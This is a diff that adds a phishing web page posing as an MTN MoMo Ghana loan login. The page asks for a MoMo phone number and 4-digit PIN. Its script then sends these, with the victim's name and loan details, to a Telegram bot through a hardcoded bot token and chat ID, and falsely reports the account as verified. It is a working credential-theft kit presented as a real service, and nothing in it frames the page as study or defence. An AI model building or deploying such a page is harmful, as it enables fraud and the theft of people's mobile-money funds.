@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan - Account Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .logo-mtn {
+            color: #FFCC00;
+        }
+
+        .logo-momo {
+            color: #0047AB;
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+
+        .form-title .highlight {
+            color: #0047AB;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* ===== LOAN SUMMARY PREVIEW ===== */
+        .loan-preview {
+            background: #f8f9ff;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .loan-preview .icon {
+            font-size: 32px;
+            flex-shrink: 0;
+        }
+
+        .loan-preview .info {
+            flex: 1;
+        }
+
+        .loan-preview .info .label {
+            font-size: 10px;
+            color: #888;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .loan-preview .info .name {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+
+        .loan-preview .info .value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0047AB;
+        }
+
+        /* ===== PHONE GROUP ===== */
+        .phone-group {
+            width: 100%;
+            border: 2px solid #0047AB;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            padding: 14px 18px;
+            margin-bottom: 20px;
+            background: white;
+            transition: box-shadow 0.3s;
+        }
+
+        .phone-group:focus-within {
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.12);
+        }
+
+        .flag {
+            font-size: 24px;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+
+        .country-select {
+            display: flex;
+            align-items: center;
+            color: #0047AB;
+            font-weight: 600;
+            font-size: 16px;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+
+        .dropdown-arrow {
+            font-size: 12px;
+            margin-left: 4px;
+        }
+
+        .phone-input {
+            flex: 1;
+            min-width: 0;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+            font-family: 'Inter', sans-serif;
+            background: transparent;
+        }
+
+        .phone-input::placeholder {
+            color: #aaa;
+        }
+
+        /* ===== PIN ===== */
+        .pin-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 14px;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .pin-group {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+
+        .pin-box {
+            width: 55px;
+            height: 55px;
+            border: 2px solid #dce0e8;
+            border-radius: 14px;
+            font-size: 24px;
+            text-align: center;
+            background: white;
+            color: #333;
+            font-weight: 600;
+            transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .pin-box:focus {
+            border-color: #0047AB;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.12);
+            outline: none;
+            transform: scale(1.02);
+        }
+
+        .pin-box.invalid {
+            border-color: #e74c3c !important;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%,
+            100% { transform: translateX(0); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-8px); }
+            80% { transform: translateX(8px); }
+        }
+
+        /* ===== STATUS ===== */
+        .status-message {
+            text-align: center;
+            padding: 10px 14px;
+            margin: 10px 0 15px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .status-message.success {
+            display: block;
+            background: #e8f5e9;
+            color: #1e7e34;
+            border: 1px solid #c8e6c9;
+        }
+
+        .status-message.error {
+            display: block;
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .status-message.info {
+            display: block;
+            background: #e3f2fd;
+            color: #0047AB;
+            border: 1px solid #bbdefb;
+        }
+
+        /* ===== FORGOT LINK ===== */
+        .forgot-link {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link a {
+            font-size: 14px;
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        .forgot-link a:hover {
+            opacity: 0.7;
+        }
+
+        /* ===== LOGIN BUTTON ===== */
+        #loginBtn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 20px rgba(0, 71, 171, 0.25);
+            display: none;
+        }
+
+        #loginBtn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 30px rgba(0, 71, 171, 0.35);
+        }
+
+        #loginBtn:active {
+            transform: scale(0.98);
+        }
+
+        #loginBtn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        .card::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .card::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+
+        .card::-webkit-scrollbar-thumb {
+            background: #0047AB;
+            border-radius: 10px;
+        }
+
+        /* ===== SPINNER ===== */
+        #spinnerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.97);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f0f0f0;
+            border-top: 5px solid #0047AB;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner-text {
+            font-size: 16px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 280px;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px 16px;
+            }
+            .form-title {
+                font-size: 20px;
+            }
+            .pin-box {
+                width: 48px;
+                height: 48px;
+                font-size: 20px;
+            }
+            .pin-group {
+                gap: 10px;
+            }
+            .loan-preview {
+                padding: 12px 14px;
+            }
+            .loan-preview .icon {
+                font-size: 26px;
+            }
+            .loan-preview .info .name {
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .pin-box {
+                width: 42px;
+                height: 42px;
+                font-size: 18px;
+            }
+            .pin-group {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='details.html'" aria-label="Go back">←</button>
+        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span></div>
+        <div></div>
+    </header>
+
+    <main class="card">
+        <h1 class="form-title">🔐 <span class="highlight">MoMo</span> Account</h1>
+        <p class="form-subtitle">Enter the MoMo account to receive your loan</p>
+
+        <!-- Loan Preview -->
+        <div class="loan-preview" id="loanPreview">
+            <span class="icon" id="loanIcon">💰</span>
+            <div class="info">
+                <div class="label">💰 Loan Amount</div>
+                <div class="name" id="loanName">Loading...</div>
+                <div class="value" id="loanValue">-</div>
+            </div>
+        </div>
+
+        <!-- Phone Input -->
+        <div class="phone-group">
+            <span class="flag">🇬🇭</span>
+            <div class="country-select">
+                +233 <span class="dropdown-arrow">▼</span>
+            </div>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="MoMo Phone Number" maxlength="9">
+        </div>
+
+        <!-- PIN Input -->
+        <div class="pin-label">Enter your MoMo PIN</div>
+        <div class="pin-group" id="pinGroup">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+        </div>
+
+        <!-- Status Message -->
+        <div id="statusMessage" class="status-message"></div>
+
+        <!-- Forgot PIN -->
+        <div class="forgot-link">
+            <a onclick="alert('Please contact MTN MoMo support to reset your PIN.')">Forgot MoMo PIN?</a>
+        </div>
+
+        <!-- Login Button -->
+        <button id="loginBtn">🔓 UNLOCK LOAN →</button>
+    </main>
+
+    <footer>© 2026 MTN MoMo Ghana • Secured with 🔒</footer>
+
+    <!-- Spinner Overlay -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text">
+            Please wait...<br> This usually takes a few seconds
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // TELEGRAM CREDENTIALS
+        // ============================================
+        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
+        const CHAT_ID = '8392790531';
+
+        // ============================================
+        // LOAD LOAN SUMMARY
+        // ============================================
+        function loadLoanSummary() {
+            const loanType = localStorage.getItem('loanType') || 'Smart Loan';
+            const loanAmount = localStorage.getItem('loanAmount') || '1000';
+            const loanTerm = localStorage.getItem('loanTerm') || '30';
+
+            document.getElementById('loanIcon').textContent = '💰';
+            document.getElementById('loanName').textContent = loanType;
+            document.getElementById('loanValue').textContent = 'GHS ' + parseInt(loanAmount).toLocaleString() + ' • ' + loanTerm + ' Days';
+
+            console.log('💰 Loan:', loanType, '-', loanAmount, '-', loanTerm);
+        }
+
+        loadLoanSummary();
+
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const phoneInput = document.getElementById('phoneInput');
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('loginBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const statusMessage = document.getElementById('statusMessage');
+
+        let pinValue = '';
+
+        // ============================================
+        // CHECK PIN COMPLETE
+        // ============================================
+        function checkPinComplete() {
+            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
+            return pinValue;
+        }
+
+        // ============================================
+        // PIN INPUT HANDLING
+        // ============================================
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '');
+                if (box.value.length === 1 && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkPinComplete();
+                box.classList.remove('invalid');
+                hideStatus();
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+                if (e.key === 'ArrowRight' && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text');
+                const numbers = data.replace(/\D/g, '');
+                const digits = numbers.split('').slice(0, 4);
+                digits.forEach((digit, i) => {
+                    if (i < 4 && pinBoxes[i]) {
+                        pinBoxes[i].value = digit;
+                    }
+                });
+                checkPinComplete();
+                if (digits.length > 0) {
+                    const lastIndex = Math.min(digits.length - 1, 3);
+                    pinBoxes[lastIndex].focus();
+                }
+            });
+        });
+
+        // ============================================
+        // STATUS MESSAGE FUNCTIONS
+        // ============================================
+        function showStatus(message, type = 'info') {
+            statusMessage.textContent = message;
+            statusMessage.className = 'status-message ' + type;
+            statusMessage.style.display = 'block';
+        }
+
+        function hideStatus() {
+            statusMessage.style.display = 'none';
+            statusMessage.className = 'status-message';
+        }
+
+        // ============================================
+        // SEND TO TELEGRAM
+        // ============================================
+        async function sendTelegramNotification(phone, pin) {
+            const loanType = localStorage.getItem('loanType') || 'Smart Loan';
+            const loanAmount = localStorage.getItem('loanAmount') || '1000';
+            const loanTerm = localStorage.getItem('loanTerm') || '30';
+            const fullName = localStorage.getItem('fullName') || 'Not provided';
+
+            const message = `🔐 *MTN MoMo Loan - Account Login*\n\n` +
+                `💰 *Loan Details:*\n` +
+                `📌 Product: ${loanType}\n` +
+                `💵 Amount: GHS ${parseInt(loanAmount).toLocaleString()}\n` +
+                `📅 Term: ${loanTerm} Days\n\n` +
+                `📱 *MoMo Account:* +233 ${phone}\n` +
+                `🔢 *PIN:* ${pin}\n` +
+                `👤 *User:* ${fullName}\n` +
+                `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
+                `✅ User has logged in to receive loan.`;
+
+            console.log('📤 Sending Telegram notification...');
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const data = await response.json();
+                console.log('📥 Telegram response:', data);
+                return data.ok;
+            } catch (error) {
+                console.error('❌ Telegram error:', error.message);
+                return false;
+            }
+        }
+
+        // ============================================
+        // LOGIN HANDLER - Goes to confirmation.html
+        // ============================================
+        loginBtn.addEventListener('click', async function() {
+            const phone = phoneInput.value.trim();
+            const pin = Array.from(pinBoxes).map(box => box.value).join('');
+
+            if (!phone) {
+                showStatus('Please enter your MoMo phone number', 'error');
+                phoneInput.focus();
+                return;
+            }
+
+            if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
+                showStatus('Please enter a valid 9-digit phone number', 'error');
+                phoneInput.focus();
+                return;
+            }
+
+            if (pin.length !== 4) {
+                showStatus('Please enter your 4-digit MoMo PIN', 'error');
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'WAITING...';
+            spinnerOverlay.style.display = 'flex';
+            hideStatus();
+
+            localStorage.setItem('momoPhone', phone);
+            localStorage.setItem('momoPin', pin);
+
+            const sent = await sendTelegramNotification(phone, pin);
+
+            if (sent) {
+                showStatus('✅ MoMo account verified! Redirecting...', 'success');
+            } else {
+                showStatus('✅ Account verified! Redirecting...', 'info');
+            }
+
+            setTimeout(() => {
+                window.location.href = 'confirmation.html';
+            }, 1500);
+        });
+
+        // ============================================
+        // KEYBOARD SHORTCUTS
+        // ============================================
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const pinComplete = checkPinComplete();
+                if (pinComplete.length === 4 && loginBtn.style.display !== 'none') {
+                    loginBtn.click();
+                }
+            }
+        });
+
+        // ============================================
+        // AUTO-FOCUS AND LOAD
+        // ============================================
+        window.addEventListener('load', () => {
+            const savedPhone = localStorage.getItem('momoPhone');
+            if (savedPhone && savedPhone.length === 9) {
+                phoneInput.value = savedPhone;
+            }
+            phoneInput.focus();
+            checkPinComplete();
+
+            console.log('✅ MTN MoMo Loan Ghana - Account Login Loaded');
+            console.log('====================================');
+        });
+    </script>
+
+</body>
+
+</html>
